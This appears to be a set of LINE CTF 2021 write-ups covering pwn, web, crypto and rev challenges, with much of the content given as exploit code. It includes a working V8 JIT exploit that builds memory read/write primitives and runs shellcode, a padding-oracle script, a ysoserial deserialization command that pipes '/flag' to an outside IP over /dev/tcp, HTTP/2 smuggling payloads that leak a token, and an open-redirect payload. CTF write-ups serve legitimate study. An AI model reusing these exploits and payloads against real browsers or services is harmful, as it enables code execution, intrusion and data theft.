# Write Ups

### pwn

**Damn Vuln** - https://kileak.github.io/ctf/2021/linectf-damn/

**babychrome **

```js
let conversion_buffer = new ArrayBuffer(8);                                     
let float_view = new Float64Array(conversion_buffer);                           
let int_view = new BigUint64Array(conversion_buffer);                           
BigInt.prototype.hex = function() {                                             
    return '0x' + this.toString(16);                                            
};                                                                              
BigInt.prototype.i2f = function() {                                             
    int_view[0] = this;                                                         
    return float_view[0];                                                       
}                                                                               
BigInt.prototype.smi2f = function() {                                           
    int_view[0] = this << 32n;                                                  
    return float_view[0];                                                       
}                                                                               
Number.prototype.f2i = function() {                                             
    float_view[0] = this;                                                       
    return int_view[0];                                                         
}                                                                               
Number.prototype.f2smi = function() {                                           
    float_view[0] = this;                                                       
    return int_view[0] >> 32n;                                                  
}                                                                               
Number.prototype.i2f = function() {                                             
    return BigInt(this).i2f();                                                  
}                                                                               
Number.prototype.smi2f = function() {                                           
    return BigInt(this).smi2f();                                                
}                                                                               
                                                                                
function hex(a) {                                                               
    return "0x" + a.toString(16);                                               
}

// https://bugs.chromium.org/p/chromium/issues/detail?id=1126249
function jit_func(a) {
    let v16213 = 0 * -1;
    var v25608 = -0x80000000;

    if (a) {
        v25608 = -(v16213 = -1);
    }

    var v19229 = ((v16213-v25608) == -0x80000000);

    if (a) {
        v19229 = -0x1337;
    }

    let v5568 = Math.sign(v19229);

    v5568 = Math.sign(v19229) < 0|0|0 ? 0 : v5568;

    let v51206 = new Array(v5568);
    
    v51206.shift();
    Array.prototype.unshift.call(v51206);
    return v51206;
    v51206.shift();
    v5568 = 2;

    var v22083 = new Array(0);
   
    v51206[5] = 1337;
    v51206[7] = v51206[5];
    v51206.shift();

    var v51606 = new Array(Math.min(0, v5568));
    
    v22083[3] = v51206;
    v51206[7] = v51606;

    return v22083.toString();
}

for (let i = 0; i < 0x10000; i++) {
    jit_func(true);
}

let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);                               
let wasm_instance = new WebAssembly.Instance(wasm_mod);                         
let f = wasm_instance.exports.main;

let shellcode = [0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x0000000e, 
0x20746163, 0x67616c66, 0x263e3120, 0x57560030, 0x0fe68948, 0x00000005];

var corrupted_arr = jit_func(false);

var oob_arr = [1.1];
let addrof_arr = [wasm_instance];
let c_arb_rw_arr = [1.1];

corrupted_arr[13] = {};

function addrof(obj) {
  addrof_arr[0] = obj;
  return (oob_arr[6].f2i() >> 32n);
}

function c_read(addr) {
  oob_arr[10] = ((addr-8n) + (2n << 32n)).i2f();
  return c_arb_rw_arr[0].f2i();
}

function c_write64(addr, val) {
  oob_arr[10] = ((addr-8n) + (2n << 32n)).i2f();
  c_arb_rw_arr[0] = val.i2f();
}

wasm_instance_addr = addrof(wasm_instance);
rwx = c_read(wasm_instance_addr+0x68n);

let typed_arr = new Uint32Array(0x200);
let typed_arr_addr = addrof(typed_arr);

c_write64(typed_arr_addr+0x28n, rwx);

for (let i = 0; i < shellcode.length; i++) {
  typed_arr[i] = shellcode[i];
}

f();
```

**atelier** - https://gist.github.com/wbowling/139155c0e6ed0ea65bafa06d62d66eb5

**pprofile** - https://gist.github.com/sampritipanda/3ad8e88f93dd97e93f070a94a791bff6



### web

**your-note**

```
there is open redirect in /login?redirect=, an example payload:  /login?redirect=.attacker.com/ which will redirect bot to our controlled host.
there is note download functionality which lets us to leak flag.
using https://xsleaks.dev/docs/attacks/navigations/#download-navigation-without-iframes we can leak the flag char by char.
```



**3233**

```python
import socketio
import requests
import string, random

HOST = "http://34.85.35.9" 

# TO_DECRYPT = b'\x0eN\x91\x03\x8dQ;R.\x11\xfc\xc1\xee\xb5P\xdf\xa7\xc7\x9fE\x98\xa8\xeb3a\x0f.fV\x80\xbc\x83'
# TO_DECRYPT = b'\xc6\xc7t\xdfv\xd2\x84!t\x1d\x95\x19\x92\xbe\xe5\x87\xd5^\x1d\xbcJu d\\^n\x0c9\xd7\x0f\x95'
TO_DECRYPT = b'k\xab\xc6\xec\xa8i@\x89\x06V\x9b\xd6\x07:B\xc1U>\x15\xf5\xfa\xdaj3\x18\xdc\xa1\xd5P\xa5\xae\xb4\xda\xab\xeb\xc9d\x05\xb8\xeck:\x92\x15Sv\xf6\xb5'

# TO_DECRYPT = b'\xd4\x88\xb6\x0e\xe1\xb5\xde+"\xa0%!\x9a\xec@\xcbB\xce\x13\xa2Z\x1de\xa9%\xaa\x9b\xb4Fzw\xc2\xc9\xb1A?\xf8/>\xb7\x02=\x17\x7fq\xe3q\x02'

DECRYPT_BLOCK = 2

KNOWN_IV = TO_DECRYPT[((DECRYPT_BLOCK-1) * 16):DECRYPT_BLOCK*16]
BLOCK = TO_DECRYPT[(DECRYPT_BLOCK)*16:(DECRYPT_BLOCK+1)*16]

KNOWN = b'LINECTF{3av3sdr0'
KNOWN = b'pr3p1ay0rac13!}\x01'
print(len(KNOWN))

PADDING_LEN = len(KNOWN)+1
PADDING = b""

for m in range(len(KNOWN)):
    PADDING += bytes([KNOWN[m] ^ KNOWN_IV[(-len(KNOWN)+m)] ^ PADDING_LEN])

IV = b"\xff"*(16-len(KNOWN))+PADDING

CHANGE_IDX = 16-len(KNOWN)-1

MESSAGE_LIST = {}

def rand_strn(N):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))

def login(uname):
    s = requests.Session()
    s.post(HOST+"/api/login", json={"username":uname, "password":rand_strn(6), "publicKey":rand_strn(6)})
    return s

def evasdrop(sio, u1, u2):
    print("Evasdropping -> ", ":".join(sorted([u1, u2])))
    sio.emit("join", {"room":":".join(sorted([u1, u2]))})

USERNAME = rand_strn(6)
sio = socketio.Client(http_session=login(USERNAME))

@sio.on('connect')
def on_connect():
    print("CONNTECTED")

@sio.on("read")
def on_read(data):
    global KNOWN
    print("READ MESSAGE")
    cur_message = MESSAGE_LIST[data['id']]
    worked_iv = cur_message[CHANGE_IDX]
    print(cur_message)
    print(worked_iv)
    ir = PADDING_LEN ^ worked_iv
    KNOWN = bytes([ir ^ KNOWN_IV[CHANGE_IDX]]) + KNOWN
    print(KNOWN)


@sio.on("message")
def on_message(data):
    # print("GOT MESSAGE")
    # print(data)

    if data['from'] == USERNAME:
        # print("GOT FROM US")
        MESSAGE_LIST[data['id']] = data['message']

sio.connect(HOST, socketio_path='/api/socket')
evasdrop(sio, "alice", "bob")

for m in range(0x100):
    new_iv = list(IV)
    new_iv[CHANGE_IDX] = m

    new_msg = bytes(new_iv) + BLOCK

    sio.emit("message", {'to': 'alice', 'message': new_msg})
```



**janken**

```
./jdk1.7.0_80/bin/java -jar ysoserial-modified.jar CommonsCollections5 bash '/bin/cat /flag > /dev/tcp/3.128.107.74/16769' > haxtest.bin

curl 'http://34.85.120.233/unregister' -X 'DELETE' 

curl -X PUT http://34.85.120.233/register -H "Content-Type: application/json" -d '{"name":"dddd","abuse": true}'

curl -X PUT http://34.85.120.233/outstretch?player=1  -H "Content-Type: application/json" --data-binary @haxtest.bin

curl -X PUT http://34.85.120.233/outstretch  -H "Content-Type: application/json" --data-binary @haxtest.bin
```



**babyweb**

Description:

```
Neko is cute

http://35.187.196.233/
Mirror: http://34.85.38.15
```

There are `internal` and `public` servers with this challenge.

The part which we must look at carefully is `public`'s `internal.py`. 

```python
import functools
import requests

from flask import (
    Blueprint, flash, g, redirect, render_template, request, session, url_for, jsonify
)

from utils import *
from config import cfg


internal_bp = Blueprint('internal', __name__, url_prefix='/internal')


@internal_bp.route("/auth", methods=["POST"])
def auth():
    data = request.get_json()
    conn = create_connection()
    headers = {
        cfg["HEADER"]["USERNAME"]: data["username"],
        cfg["HEADER"]["PASSWORD"]: data["password"]
    }
    conn.request("GET", "/auth", headers=headers)
    resp = conn.get_response()
    return resp.read()


@internal_bp.route("/health", methods=["POST"])
def health():
    try:
        data = request.get_json()

        if "type" in data.keys():
            if data["type"] == "1.1":
                requests.get("https://" + cfg["INTERNAL"]["HOST"] + "/health", verify=False)

                headers = {
                    cfg["HEADER"]["USERNAME"]: cfg["ADMIN"]["USERNAME"],
                    cfg["HEADER"]["PASSWORD"]: cfg["ADMIN"]["PASSWORD"]
                }
                requests.get("https://" + cfg["INTERNAL"]["HOST"] + "/auth", headers=headers, verify=False)
                r = requests.post("https://" + cfg["INTERNAL"]["HOST"] + "/", data=data["data"].encode('latin-1'), verify=False)
                return r.text

            elif data["type"] == "2":
                conn = create_connection()
                conn.request("GET", "/health")
                resp = conn.get_response()

                headers = {
                    cfg["HEADER"]["USERNAME"]: cfg["ADMIN"]["USERNAME"],
                    cfg["HEADER"]["PASSWORD"]: cfg["ADMIN"]["PASSWORD"]
                }
                conn.request("GET", "/auth", headers=headers)
                resp = conn.get_response()

                conn._new_stream()
                
                conn._send_cb(data["data"].encode('latin-1'))
                conn._sock.fill()
                return conn._sock.buffer.tobytes()
                
            else:
                return "done."
        else:
            return "done."
            
    except:
        return "error occurs"
```

if you check `/health` part, there are two options there, `type == 1.1` and `type == 2`. I guess most people noticed making requests via `HTTP/2`. It makes requests via `http/2` if we set the `type` as 2. Since `HTTP/2` communicates with server at once(?) (It's hard to present how it works lol), maybe we can inject our crafted requests for `/flag`. So, I just started to find about how HTTP/2's packet works and found https://httpwg.org/specs/rfc7541.html and https://tools.ietf.org/html/rfc7540. This is actually about how `HTTP/2` works in communication and thought there is a method to re-use the information which is used before with `HTTP/2` since it's working method and actually it is. After I read rfc, I started to code for leaking JWT token at `/internal/health`. I modified the hyper lib and changed the streamID manually for making packet.



So, below code will leak token

```python
import requests

data = b'\x00\x00\x06\x01\x05\x00\x00\x00\x05\x82\x87\xc2\xc0\xbf\xbe\n\n'

r = requests.post('http://35.187.196.233/internal/health',json={'type':'2','data':data.decode('latin-1')})
print(r.text)
```

And this one will requests for flag(I crafted with the leaked token.)

```python
import requests

data = b'\x00\x00\x86\x01\x05\x00\x00\x00\x05\x82\x87\xc2D\x84bZ\x077@\x86\xf2\xb2O\xd4\xb5\x7f\xf4/\xac\xb3\xc7\x88\x86\xd4l\xb98{\xc8\x1d&\xc8\x8c\x95ml\x97\xb29\x93\xad\x7f\x9coe}r\xfa\xca\x12\x0b\x8f\xac\x9d\x0en|\xb6\xa4|\x9a6{\xd9}F/4d\xe8ss\xe5\xb5#\xe4\xd1\xb3\xde\xcb_?\xcd\x86\xd5\xd3\x00\xb4o\xe7\xebN\xfc\x00\xd3\xefK\xeb\xcd\x9f\x06\x10E\xa7\xd6W\xde\xcfX,\xbb\xfb.~\x9b;c\xea\xd3e{\xb5i\xb7\x84L\xd3\x7f\x06^\xcd\xb7\xc3\n\n' 

print(r.text)
```

Flag: `LINECTF{this_ch4ll_1s_really_baby_web}`



**diveinternal**

```js
// app.js

...

var apisRouter = require('./routes/apis');

...

app.use('/apis', apisRouter);

...
```

In `app.js`, it uses `./routes/apis.js` for `/apis` .



```js
// ./routes/apis.js

...

    router.get('/coin', function(req, res, next) {
      request({
            headers: req.headers,
            uri: `http://${target}/coin`,
          }).pipe(res);
      });

  router.get('/addsub', function(req, res, next) {
    request({
          
          uri: `http://${target}/addsub`,
          qs: {
            email: req.query.email,
          }
        }).pipe(res);
    });

...
```

`${tartget}` points internal private server. Let's check code for private.

In private's `LanguageNormalize` function, it has the SSRF because of below code

```
requests.get(request.host_url+language, headers=request.headers)
```

Assume we make a request with `host: private:5000` and modified `Lang` to point private's route.

It will return the result of internal route's result and add this at the header which is in response. So, we have SSRF.



```python
@app.route('/integrityStatus', methods=['GET'])
def integritycheck():
    data = {'db':'database/master.db','dbhash':activity.dbHash}
    data = json.dumps(data)
    return data
```

this part will be used for leaking dbhash since we have SSRF.



Since the code has fixed privateKey and we know how the sigining works, we can generate this easily.

This means we can use `rollback` for getting flag.

```python
privateKey = b'let\'sbitcorinparty'

...

def SignCheck(request):
    sigining = hmac.new( privateKey , request.query_string, hashlib.sha512 )

    if sigining.hexdigest() != request.headers.get('Sign'):
        return False
    else:
        return True

...

@app.route('/rollback', methods=['GET'])
def rollback():
    try:
        if request.headers.get('Sign') == None:
            return json.dumps(status['sign'])
        else:
            if SignCheck(request):
                pass
            else:
                return json.dumps(status['sign'])

        if request.headers.get('Key') == None:
            return json.dumps(status['key'])
        result  = activity.IntegrityCheck(request.headers.get('Key'),request.args.get('dbhash'))
        return result
    except Exception as e :
        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)
        logger.error(err)
        return json.dumps(status['error']), 404
```



our exploit (I did this process on my hand via burpsuite's repeater function. So, there is no code)

- SSRF to `/intergrityStatus` for getting dbhash
- generate the sigining key and `rollback` using generated key and dbhash
- get flag



Flag: `LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}`



### crypto

All crypto challs - https://rkm0959.tistory.com/219



### rev

Sakura

```
1
1
1
1
1
1
1
1
1
1
3
4
```

